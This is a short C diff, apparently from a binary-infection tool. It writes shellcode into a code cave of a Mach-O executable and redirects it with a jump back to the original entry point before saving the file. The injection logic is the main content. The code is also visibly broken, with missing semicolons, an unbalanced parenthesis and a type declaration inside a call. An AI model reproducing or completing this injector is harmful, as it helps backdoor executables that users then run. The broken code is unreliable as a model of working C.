@@ -53,7 +53,7 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			    sclen+=5;
 			if(sclen<cavelen)
 			{
-				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,uint32_t entry_point,0) 
+				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
 				memcpy(file_buffer+cave_offset,shellcodefixed,sclen);
 				 fwrite(file_buffer,1,size,f);
 				 free(shellcodefixed);
@@ -85,6 +85,7 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			uint32_t    cavelen= sectionCommand->offset-caveOffset;
 			if(scfixedlen<cavelen)
 			{
+				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
 				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
 				 fwrite(buf,1,size,f);
 				 free(shellcodefixed);
